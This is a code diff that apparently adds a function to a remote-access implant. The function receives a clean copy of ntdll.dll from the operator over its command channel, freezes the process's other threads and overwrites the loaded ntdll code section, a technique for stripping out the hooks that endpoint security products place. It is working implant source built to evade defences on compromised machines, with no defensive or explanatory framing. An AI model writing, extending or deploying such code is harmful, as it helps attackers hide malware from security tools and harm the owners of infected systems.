@@ -510,3 +510,123 @@ ERR:
     tremont_end_stream(trans->stream_id, trans->nexus);
     return -1;
 }
+
+int implant_unhookbyon(struct wrkr_trans_t* trans, struct unhookbyon_req_t* req) {
+    Tremont_Nexus* nexus = trans->nexus;
+    tremont_stream_id stream = trans->stream_id;
+
+    struct wrkr_msg_t msg;
+    msg.msg_enum = UNHOOK_BYON;
+    msg.upload.msg_enum = RES;
+    msg.upload.res.allowed = 1;
+
+    tremont_send(stream, (byte*)&msg,
+        sizeof(msg), nexus);
+
+    int64_t total_recvd = 0;
+    int64_t total_size = req->file_len;
+
+    int recvd = 0;
+    int written = 0;
+    char temp_buf[255];
+
+    tremont_opts_stream(stream, OPT_NONBLOCK, 1, nexus);
+
+    char* ntdll_buf;
+    ntdll_buf = calloc(1, req->file_len);
+
+    while (total_recvd < total_size) {
+        recvd = tremont_recv(stream,
+            (byte*)temp_buf, sizeof(temp_buf), nexus);
+        memcpy(ntdll_buf + total_recvd, temp_buf, recvd);
+        total_recvd += recvd;
+    }
+
+    memset(&msg, 0, sizeof(msg));
+    msg.msg_enum = UNHOOK_BYON;
+    msg.unhookbyon.msg_enum = RES;
+    msg.unhookbyon.unhooking.sanity = 1;
+
+    tremont_send(stream, (byte*)&msg, sizeof(msg), nexus);
+
+    _freeze_all_other_threads();
+
+    MODULEINFO module_info;
+    HANDLE process_handle = GetCurrentProcess();
+    HMODULE ntdll_module = GetModuleHandleA("ntdll.dll");
+    if (ntdll_module == NULL) return -1;
+
+    GetModuleInformation(process_handle,
+        ntdll_module, &module_info, sizeof(module_info));
+
+    void* ntdll_base = module_info.lpBaseOfDll;
+
+    PIMAGE_DOS_HEADER dos_header;
+    dos_header = (PIMAGE_DOS_HEADER)ntdll_base;
+
+    PIMAGE_NT_HEADERS nt_headers;
+    nt_headers = (PIMAGE_NT_HEADERS)(
+        (DWORD_PTR)ntdll_base + dos_header->e_lfanew
+        );
+
+    for (uint16_t i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
+        PIMAGE_SECTION_HEADER section_header;
+        section_header = (PIMAGE_SECTION_HEADER)(
+            (DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) +
+            ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i)
+            );
+
+        if (strncmp(section_header->Name, ".text", 5)) continue;
+
+        BOOL is_protected;
+        uint32_t old_protection;
+        uint32_t size_of_text;
+
+        DWORD* uploaded_text_section;
+        DWORD* running_text_section;
+
+        size_of_text = section_header->Misc.VirtualSize;
+
+        running_text_section = (DWORD*)ntdll_base +
+            section_header->VirtualAddress;
+
+        uploaded_text_section = (DWORD*)ntdll_buf +
+            section_header->VirtualAddress;
+
+        is_protected = VirtualProtect(
+            running_text_section,
+            size_of_text,
+            PAGE_EXECUTE_READWRITE,
+            &old_protection
+        );
+
+        memcpy(running_text_section, uploaded_text_section, size_of_text);
+
+        is_protected = VirtualProtect(
+            running_text_section,
+            size_of_text,
+            old_protection,
+            &old_protection
+        );
+    }
+
+    _unfreeze_all_other_threads();
+    CloseHandle(process_handle);
+    free(ntdll_buf);
+
+    memset(&msg, 0, sizeof(msg));
+    msg.msg_enum = UNHOOK_L;
+    msg.upload.msg_enum = FIN;
+    msg.upload.fin.sanity = 1;
+
+    tremont_send(trans->stream_id, (byte*)&msg,
+        sizeof(msg), trans->nexus);
+
+    memset(&msg, 0, sizeof(msg));
+    tremont_recv(trans->stream_id, (byte*)&msg,
+        sizeof(msg), trans->nexus);
+
+    tremont_end_stream(trans->stream_id, trans->nexus);
+
+    return 0;
+}
